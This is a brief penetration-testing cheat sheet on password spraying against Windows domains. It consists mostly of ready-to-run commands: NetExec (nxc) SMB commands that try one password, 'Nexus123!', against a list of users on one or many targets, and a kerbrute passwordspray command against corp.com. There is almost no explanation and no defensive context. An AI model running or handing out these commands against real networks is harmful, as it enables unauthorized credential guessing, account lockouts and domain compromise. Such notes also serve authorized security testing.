# SMB Password Spraying
Sprays user accounts with "Nexus123!" password
```bash
nxc smb $(ANY_DOMAIN_JOINED_MACHINE_IP) -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
```
Spray multiple targets at once:
```bash
nxc smb -t targets.txt -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
```
# TGT Password Spraying
https://github.com/ropnop/kerbrute

Kerbrute can be run on windows or linux. This example ruins on windows to spray usernames with the password "Nexus123!".
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
